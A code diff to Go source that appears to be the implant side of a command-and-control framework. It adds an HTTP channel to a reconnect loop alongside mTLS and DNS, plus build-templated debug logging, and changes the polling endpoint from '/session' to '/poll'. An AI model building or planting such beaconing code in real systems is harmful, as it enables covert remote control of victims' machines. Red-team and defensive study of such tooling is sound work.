@@ -14,7 +14,9 @@ import (
 	"sync"
 	"time"
 
+	// {{if .HTTPServer}}
 	"github.com/golang/protobuf/proto"
+	// {{end}}
 )
 
 var (
@@ -107,6 +109,18 @@ func StartConnectionLoop() *Connection {
 		connectionAttempts++
 		// {{end}}  - MTLSServer
 
+		// *** HTTP ***
+		// {{if .HTTPServer}}
+		connection, err = httpConnect()
+		if err == nil {
+			return connection
+		}
+		// {{if .Debug}}
+		log.Printf("[mtls] Connection failed %s", err)
+		// {{end}}
+		connectionAttempts++
+		// {{end}} - HTTPServer
+
 		// *** DNS ***
 		// {{if .DNSParent}}
 		connection, err = dnsConnect()
@@ -119,6 +133,9 @@ func StartConnectionLoop() *Connection {
 		connectionAttempts++
 		// {{end}} - DNSParent
 
+		// {{if .Debug}}
+		log.Printf("sleep ...")
+		// {{end}}
 		time.Sleep(reconnectInterval)
 	}
 	// {{if .Debug}}
@@ -197,10 +214,15 @@ func getDefaultMTLSLPort() int {
 
 // {{if .HTTPServer}}
 func httpConnect() (*Connection, error) {
-
 	address := getHTTPAddress()
+	// {{if .Debug}}
+	log.Printf("Connecting -> http(s)://%s", address)
+	// {{end}}
 	client, err := HTTPStartSession(address)
 	if err != nil {
+		// {{if .Debug}}
+		log.Printf("http(s) connection error %v", err)
+		// {{end}}
 		return nil, err
 	}
 
@@ -235,7 +257,7 @@ func httpConnect() (*Connection, error) {
 			case <-ctrl:
 				return
 			default:
-				resp, err := client.Get("/session")
+				resp, err := client.Get("/poll")
 				if err != nil && resp != nil {
 					envelope := &pb.Envelope{}
 					proto.Unmarshal(resp, envelope)
